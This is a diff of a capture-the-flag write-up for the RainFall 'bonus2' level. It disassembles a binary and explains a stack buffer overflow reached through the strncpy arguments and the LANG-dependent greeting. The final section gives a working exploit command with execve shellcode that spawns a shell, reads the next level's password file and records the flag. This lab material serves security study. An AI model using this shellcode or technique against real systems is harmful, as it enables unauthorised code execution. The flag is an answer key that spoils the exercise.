@@ -1,21 +1,22 @@
 
-#### notes
-```
+### notes
+```c
 0x08049988  language    : global variable language
 0x08048484  greetuser : called in main
 0x08048529  main
 ```
 
-#### 0x08048529 : main() : disassembly
+### 0x08048529 : main() : disassembly
+- notebook: (to convert `hex` to `dec` and assign variable names for better reading)
 ```c
 {
     int argc = ebp+0x8
-    char *argv = ebp+12 = ebp+12
+    char *argv = ebp+12
     char *buffer[72] = esp+0x50 = esp+80 // 40+32
     char *envLang = esp+0x9c
 }
 ```
-_`<0> ==> <+9> : prepare stack frame for n function with size 160`_
+_**`<0> ==> <+9> : prepare stack frame for n function with size 160`**_
 ```c
 0x08048529 <+0>:	push   ebp
 0x0804852a <+1>:	mov    ebp,esp
@@ -25,14 +26,14 @@ _`<0> ==> <+9> : prepare stack frame for n function with size 160`_
 0x0804852f <+6>:	and    esp,0xfffffff0
 0x08048532 <+9>:	sub    esp, 0xa0 // 160
 ```
-_`<+15> ==> <+26> : compare argc to 3 , if equal : jump to main+31 , else : jumpe to +263 (return)`_
+_**`<+15> ==> <+26> : compare argc to 3 , if equal : jump to main+31 , else : jumpe to +263 (return(1))`**_
 ```c
-0x08048538 <+15>:	cmp    DWORD PTR [argc],0x3
+0x08048538 <+15>:	cmp    DWORD PTR [argc],3
 0x0804853c <+19>:	je     0x8048548 <main+31>
-0x0804853e <+21>:	mov    eax,0x1
+0x0804853e <+21>:	mov    eax,1
 0x08048543 <+26>:	jmp    0x8048630 <main+263>
 ```
-_`<+31> ==> <+49> : copy from eax content to where edi points by 4 bytes each time, (number of times = eax), each time increment edi with 4 bytes until eax reach 0 after decrementting by -1 each loop`_
+_**`<+31> ==> <+49> : copy from eax content to where edi points by 4 bytes each time, (number of times = eax), each time increment edi with 4 bytes until eax reach 0 after decrementting by -1 each loop`**_
 ```c
 0x08048548 <+31>:	lea    ebx,[buffer]
 0x0804854c <+35>:	mov    eax,0x0 // eax = 0
@@ -45,10 +46,10 @@ buffer[1] = 0
 buffer[2] = 0
 buffer[3] = 0
 ...
-buffer[19*4~76] = 0
+buffer[19*4=76] = 0
 equivalant to memset(buffer, 0, 76)
 ```
-_`<+51> ==> <+78> : copy 40 bytes from argv[1] to buffer`_
+_**`<+51> ==> <+78> : copy 40 bytes from argv[1] to buffer`**_
 ```c
 0x0804855c <+51>:	mov    eax,DWORD PTR [argv]
 0x0804855f <+54>:	add    eax,4 // argv[1]
@@ -59,48 +60,57 @@ _`<+51> ==> <+78> : copy 40 bytes from argv[1] to buffer`_
 0x08048574 <+75>:	mov    DWORD PTR [esp],eax // param1 = buffer
 0x08048577 <+78>:	call   0x80483c0 <strncpy@plt> 
                             // strncpy(param1, param2, param3)
-                            strncpy(buffer, argv[1], 40)
-                            // buffer[0-39] = argv[1][0-39]
+strncpy(buffer, argv[1], 40)
+//buffer[0-39] = argv[1][0-39]
 ```
-_`<+83> ==> <+113> : copy 32 bytes from argv[2] to the index 40 from buffer so , will start to copy in the buffer starting from the address of buffer[40]`_
+_**`<+83> ==> <+113> : copy 32 bytes from argv[2] to the index 40 from buffer so , will start to copy in the buffer starting from the address of buffer[40]`**_
 ```c
 0x0804857c <+83>:	mov    eax,DWORD PTR [argv]
 0x0804857f <+86>:	add    eax,8// argv[2]
 0x08048582 <+89>:	mov    eax,DWORD PTR [eax] // *argv[2]
-0x08048584 <+91>:	mov    DWORD PTR [esp+8,0x20 // param3 = 32
+0x08048584 <+91>:	mov    DWORD PTR [esp+8],0x20 // param3 = 32
 0x0804858c <+99>:	mov    DWORD PTR [esp+4],eax // param2 = argv[2]
 0x08048590 <+103>:	lea    eax,[buffer] // buffer
 0x08048594 <+107>:	add    eax,0x28 // buffer[40]
 0x08048597 <+110>:	mov    DWORD PTR [esp],eax // param1 = &buffer[40]
 0x0804859a <+113>:	call   0x80483c0 <strncpy@plt>
                             // strncpy(param1, param2, param3)
-                            strncpy(&buffer[40], argv[2], 32)
-                            // here we can understand the value of buffer size which is 40+32 = 72
+strncpy(&buffer[40], argv[2], 32)
+// here we can understand the value of buffer size which is 40+32 = 72
 ```
 
-_`<+118> ==> <+145> : get the LANG env variable, if LANG == 0 call greetuser func `_
+_**`<+118> ==> <+145> : get the LANG env variable, if LANG == 0 call greetuser func `**_
 ```c
 0x0804859f <+118>:	mov    DWORD PTR [esp],0x8048738 // ~ "LANG"
 0x080485a6 <+125>:	call   0x8048380 <getenv@plt> // env = getenv("LANG")
 0x080485ab <+130>:	mov    DWORD PTR [esp+156],eax // envLang = env
 0x080485b2 <+137>:	cmp    DWORD PTR [esp+156],0x0 // compare envLang <=to=> 0
 0x080485ba <+145>:	je     0x8048618 <main+239> // if envLang == 0 jump to +239 to call greetuser function
+if (getenv("LANG") == 0) {
+    jump to <main+239>    (greetuser)
+}
 ```
-_`<+147> ==> <+192> : if (envLang == "fi") { language = 1 } else { jump to +239}`_
+_**`<+147> ==> <+192> : if (envLang == "fi") { language = 1 } else { jump to +239}`**_
 ```c
-0x080485bc <+147>:	mov    DWORD PTR [esp+8,0x2 // param3 = 2
+0x080485bc <+147>:	mov    DWORD PTR [esp+8],2 // param3 = 2
 0x080485c4 <+155>:	mov    DWORD PTR [esp+4],0x804873d // param2 = "fi"
-0x080485cc <+163>:	mov    eax,DWORD PTR [envLang] = eax = envLang
+0x080485cc <+163>:	mov    eax,DWORD PTR [envLang] // eax = envLang
 0x080485d3 <+170>:	mov    DWORD PTR [esp],eax // param1 = envLang
 0x080485d6 <+173>:	call   0x8048360 <memcmp@plt> 
                             // eax = memcmp(param1, param2, param3)
                             eax = memcmp(envLang, "fi", 2)
 0x080485db <+178>:	test   eax,eax // eax == 0 ? 
 0x080485dd <+180>:	jne    0x80485eb <main+194> if not equal to 0 jump to 194
-0x080485df <+182>:	mov    DWORD PTR ds:language,0x1 // else : language = 1
+0x080485df <+182>:	mov    DWORD PTR ds:language,1 // else : language = 1
 0x080485e9 <+192>:	jmp    0x8048618 <main+239> // jump to +239 to call greetuser function
+if (memcmp(envLang, "fi", 2) == 0) {
+    language = 1
+    jump to <main+239>    (greetuser)
+} else
+    jump to  <main+194> (the other memcpy check for "ni")
+
 ```
-_`<+194> ==> <+229> : if (envLang == "nl") { language = 2 } else { jump to +239}`_
+_**`<+194> ==> <+229> : if (envLang == "nl") { language = 2 } else { jump to +239}`**_
 ```c
 0x080485eb <+194>:	mov    DWORD PTR [esp+8,0x2 // param3 = 2
 0x080485f3 <+202>:	mov    DWORD PTR [esp+4],0x8048740 // param2 = "nl"
@@ -111,9 +121,13 @@ _`<+194> ==> <+229> : if (envLang == "nl") { language = 2 } else { jump to +239}
                             eax = memcmp(envLang, "ni", 2)
 0x0804860a <+225>:	test   eax,eax // eax == 0 ? 
 0x0804860c <+227>:	jne    0x8048618 <main+239>  if not equal to 0 jump to 239
-0x0804860e <+229>:	mov    DWORD PTR ds:language,0x2 // language = 2
+0x0804860e <+229>:	mov    DWORD PTR ds:language,2 // language = 2
+if (memcmp(envLang, "ni", 2) == 0) {
+    language = 2
+    complete to <main+239>    (greetuser)
+}
 ```
-_`<+239> ==> <+258> : to call a function u need to setup params in stack , in this case we want to call greetuser with buffer value so in order to do that, we copied all content of buffer to esp by rep movs instruction `_
+_**`<+239> ==> <+258> : to call a function u need to setup params in stack , in this case we want to call greetuser with buffer value so in order to do that, we copied all content of buffer to esp by rep movs instruction `**_
 ```c
 0x08048618 <+239>:	mov    edx,esp // edx = esp
 0x0804861a <+241>:	lea    ebx,[buffer]
@@ -126,7 +140,7 @@ _`<+239> ==> <+258> : to call a function u need to setup params in stack , in th
                                         // greetuser(esp) 
                                         greetuser(buffer)
 ```
-_`<+263> ==> <+270> : find the last ebp and quit the programm ~ return 1`_
+_**`<+263> ==> <+270> : find the last ebp and quit the programm ~ return 1`**_
 ```c
 0x08048630 <+263>:	lea    esp,[ebp-12]
 0x08048633 <+266>:	pop    ebx
@@ -135,17 +149,18 @@ _`<+263> ==> <+270> : find the last ebp and quit the programm ~ return 1`_
 0x08048636 <+269>:	pop    ebp
 0x08048637 <+270>:	ret
 ```
-#### 0x08048484 : greetuser() : disassembly
+### 0x08048484 : greetuser() : disassembly
+- notebook: (to convert `hex` to `dec` and assign variable names for better reading)
 ```c
 char *buffer // = ebp-72 
 ```
-_`<0> ==> <+3> : prepare stack frame for n function with size 160`_
+_**`<0> ==> <+3> : prepare stack frame for n function with size 160`**_
 ```c
 0x08048484 <+0>:	push   ebp
 0x08048485 <+1>:	mov    ebp,esp
 0x08048487 <+3>:	sub    esp,88
 ```
-_`<0> ==> <+9> : prepare stack frame for n function with size 160`_
+_**`<0> ==> <+9> : prepare stack frame for n function with size 160`**_
 ```c
 0x0804848a <+6>:	mov    eax,ds:language
 0x0804848f <+11>:	cmp    eax,0x1
@@ -231,7 +246,7 @@ puts(buffer)
 0x08048527 <+163>:	leave
 0x08048528 <+164>:	ret
 ```
-#### main code 
+### Code Prediction:
 ```c
 int language = 0 // 0x08049988 <=== (gdb) info var
 
@@ -316,7 +331,7 @@ Program received signal SIGSEGV, Segmentation fault.
 (gdb)
 ```
  
-`if LANG is set to "fi" , the global variable Language is 1 and our buffer will get concat with (Hyvää päivää ), but thats enough to overwrite EIP at the offset of 18`
+>if LANG is set to "fi" , the global variable Language is 1 and our buffer will get concat with (Hyvää päivää ), but thats enough to overwrite EIP at the offset of 18
 
 ----
 
@@ -334,19 +349,19 @@ Program received signal SIGSEGV, Segmentation fault.
 (gdb)
 
 ```
-`if LANG is set to "nl" , the global variable Language is 1 and our buffer will get concat with (Goedemiddag! ), but thats enough to overwrite EIP at the offset of 23`
+>if LANG is set to "nl" , the global variable Language is 1 and our buffer will get concat with (Goedemiddag! ), but thats enough to overwrite EIP at the offset of 23
 
 
 
 ---
-#### Solution :
+### Solution :
 - inject the shellcode into argv[1]
 - put the address of the buffer in the overflow offset of argv[2]
 - argv[1] = [shellcode(21) + suffix(19)] total 40 length
 - argv[2] = [prefix(18) + buffer address (0xbffff650) in little endian (4)]
 
 
-```
+```shell
 bonus2@RainFall:~$ /home/user/bonus2/bonus2 $(python -c 'print "\x90" * 19 +"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"') $(python -c 'print "B" * 18 + "\xbf\xff\xf6\x50"[::-1] ' )
 Hyvää päivää �������������������j
                                  X�Rh//shh/bin��1�̀BBBBBBBBBBBBBBBBBBP���
@@ -359,6 +374,7 @@ $ cat /home/user/bonus3/.pass
 $
 ```
 
+|**`flag:71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587`**
 ---
 
  
